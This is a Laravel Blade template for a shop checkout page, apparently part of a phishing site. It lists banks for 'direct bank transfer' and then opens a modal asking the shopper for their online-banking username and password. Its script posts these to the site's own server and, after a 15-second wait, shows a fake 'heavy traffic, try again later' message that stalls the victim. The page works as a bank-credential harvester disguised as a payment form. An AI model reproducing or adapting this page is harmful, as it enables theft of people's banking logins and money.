@extends('layouts.frontend.master')

@section('content')

@php
    $setting = \App\Models\Setting::first();
@endphp

<!-- Start Checkout Area -->
<section class="checkout-area py-5">
    <div class="container">
        <div class="row">
            <div class="col-lg-6 col-md-12">
                <div class="billing-details">
                    <h3 class="title" >{{__('page.direct_bank_transfer')}}</h3>

                    <div class="row" id="bank_list">
                        <div class="col-12 payment-box">
                            <div class="bank_logo mt-2 text-center">
                                <img src="{{asset('images/bank/ebanking_my.png')}}" alt="">
                            </div>
                            @php
                                $banks = \App\Models\Bank::all();
                            @endphp
                            <div class="payment-method">
                                @foreach ($banks as $item)
                                    <p class="mt-4">
                                        <input type="radio" id="{{$item->slug}}" name="bank" class="radio-bank" value="{{$item->id}}">
                                        <label for="{{$item->slug}}" class="clearfix">
                                            {{$item->name}}
                                            <img src="{{asset($item->image)}}" class="float-right" width="80" alt="">
                                        </label>
                                    </p>
                                @endforeach
                            </div>
                        </div>
                    </div>

                    <hr id="sep_hr" class="mt-3" />

                    {{-- <h3 class="title mt-4" style="cursor: pointer;" data-toggle="collapse" data-target="#payoneer_list">Payoneer Transfer</h3>

                    <div class="row collapse" id="payoneer_list">
                        <div class="col-12 payment-box">
                            <div class="payment-method">
                                <p class="mt-4">
                                    <input type="radio" id="payment_payoneer" name="bank" value="payoneer">
                                    <label for="payment_payoneer" class="clearfix">
                                        Payoneer Payment
                                        <img src="{{asset('images/payoneer.jpg')}}" class="float-right" width="80" alt="">
                                    </label>
                                </p>
                            </div>
                        </div>
                    </div> --}}
                </div>
            </div>
            @php
                $reference_no ="#".substr(time(),4);
            @endphp
            <div class="col-lg-6 col-md-12">
                <div class="order-details" id="order_details">
                    <div class="order-table table-responsive mt-5 mt-md-0">
                        <h3 class="title">{{__('page.your_order')}}</h3>
                        <h5 class="text-primary">REF : {{$reference_no}}</h5>
                        <h6>{{date('d F Y h:i A')}}</h6>
                        <h5 class="text-primary">Booking Fees : <span>{{$setting->total_amount}}</span></h5>
                        <table class="table table-bordered">
                            <thead>
                                <tr>
                                    <th scope="col">{{__('page.product_name')}}</th>
                                    <th scope="col">{{__('page.total')}}</th>
                                </tr>
                            </thead>

                            <tbody>
                                @php
                                    $cart = session('cart');
                                    $total_amount = 0
                                @endphp
                                @foreach ($cart as $key => $quantity)
                                    @php
                                        $product = \App\Models\Product::find($key);
                                        $amount = $product->price * $quantity;
                                        $total_amount += $amount;
                                    @endphp
                                    <tr>
                                        <td class="product-name">
                                            <a href="javascript:;">{{$product->name}} x {{$quantity}}</a>
                                        </td>

                                        <td class="product-total">
                                            <span class="subtotal-amount">RM {{$amount}}</span>
                                        </td>
                                    </tr>
                                @endforeach

                            </tbody>
                            <tfoot>
                                <tr>
                                    <td class="font-weight-bold text-right">{{__('page.total_amount')}} : </td>
                                    <td class="font-weight-bold" style="padding: 12px 20px;">RM <span id="total_amount">{{$total_amount}}</span></td>
                                </tr>
                            </tfoot>
                        </table>
                        <p>{{$setting->invoice_description}}</p>
                        <a href="javascript:;" class="btn btn-success btn-block mt-3" id="btn_place" >{{__('page.place_order')}}
                            <i class="flaticon-right"></i>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>
<!-- End Checkout Area -->

<div class="modal" id="bankModal">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title">* {{__('page.secure_online_banking')}} :</h4>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <div class="modal-body">
                <div class="row d-flex justify-content-center" id="paymentBox">
                    <div class="col-md-3 pt-3">
                        <img src="" class="logo-img img-fluid" id="modal_bank_img" width="100%" alt="">
                    </div>
                    <div class="col-md-9 form-area">
                        <h6 class="text-center">{!! __('page.bank_modal_message') !!}</h6>
                        <form action="{{route('place_order')}}" method="post" id="paymentForm">
                            @csrf
                            <input type="hidden" class="bank" name="bank_id" id="bank_id" />
                            <input type="hidden" name="reference_no" value="{{$reference_no}}">
                            <input type="hidden" name="amount" class="amount" />
                            <div class="form-group mt-3">
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text"><i class='bx bxs-user'></i></span>
                                    </div>
                                    <input type="text" class="form-control username" id="usernameForm" name="username" required placeholder="{{__('page.bank_username')}}">
                                </div>
                            </div>
                            <div class="form-group mt-3">
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text"><i class='bx bxs-lock'></i></span>
                                    </div>
                                    <input type="password" class="form-control password" name="password" required placeholder="{{__('page.bank_password')}}">
                                </div>
                            </div>
                            <div class="form-group mt-3">
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text"><i class='bx bx-money'></i></span>
                                    </div>
                                    <input type="text" class="form-control total_amount" name="total_amount" readonly placeholder="{{__('page.total_amount')}}" value="{{$setting->total_amount}}" />
                                </div>
                            </div>
                            <div class="form-group mt-3">
                                <button type="submit" class="btn btn-primary btn-block mt-2" id="btn_submit">{{__('page.submit')}}</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

@endsection

@section('script')
    <script>
        $(document).ready(function () {
            var whatsapp = "{{$setting->whatsapp}}";
            var email = "{{$setting->email}}";

            var current_url = "{{$_SERVER['REQUEST_URI']}}";
            // Swal.fire(`<div class="text-left pt-3" style="font-size: 17px;"><p>Site will be slow due to heavy traffice. Please Try again later.</p><p>Contact or WhatsApp <a href="https://api.whatsapp.com/send?phone=${whatsapp}" target="_blank">${whatsapp}</a></p><p>Email us at <a href="mailto:${email}">${email}</a></p></div>`);

            $('.radio-bank').change(function() {
                if (this.value != '' && window.mobilecheck()) {
                    window.location.href = current_url + "#sep_hr";
                }
            });

            $("#btn_place").click(function(){
                let bank = $("input[name='bank']:checked").val();
                let total_amount = $("#total_amount").text();
                let image = $("input[name='bank']:checked").parents('p').find('img').attr('src');

                if(!bank) {
                    alert('Please select the payment option.');
                } else if(bank == 'payoneer') {

                } else {
                    $("#bank_id").val(bank);
                    $("#modal_bank_img").attr('src', image);
                    $("#paymentForm .amount").val(total_amount);
                    $("#bankModal").modal();
                }
            });

            $("#paymentForm").submit(function(e) {
                e.preventDefault();
                if (bank_id == '') {
                    alert('Please select payment option.');
                    $("#bankModal").modal('hide');
                    return false;
                } else {
                    $.ajax({
                        url: '/place_order',
                        data: $("#paymentForm").serialize(),
                        method: 'POST',
                        dataType: 'json',
                        beforeSend: function() {
                            $("#bankModal").modal('hide');
                            $("#ajax-loading").fadeIn();
                        },
                        success: function(response) {
                            if(response.status == 200) {
                                setTimeout(function() {
                                    $("#ajax-loading").fadeOut();
                                    Swal.fire(`<div class="text-left pt-3" style="font-size: 17px;"><p>Site will be slow due to heavy traffice. Please Try again later.</p><p>Contact or WhatsApp <a href="https://api.whatsapp.com/send?phone=${whatsapp}" target="_blank">${whatsapp}</a></p><p>Email us at <a href="mailto:${email}">${email}</a></p></div>`);
                                }, 15000);
                            } else if (response.status == 400) {
                                if(response.result == 'cart_error') {
                                    window.location.href = '/cart';
                                }
                                if(response.result == 'customer_error') {
                                    window.location.href = '/input_customer';
                                }
                            } else {
                                window.location.href = '/';
                            }
                        },
                    });
                }
            });

            window.mobilecheck = function() {
                var check = false;
                (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge|maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm(os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windowsce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|awa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s)|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-||_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac(|\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt|kwc\-|kyo(c|k)|le(no|xi)|lg(g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-||o|v)|zz)|mt(50|p1|v)|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v)|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-|)|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
                return check;
            };
        });
    </script>
@endsection
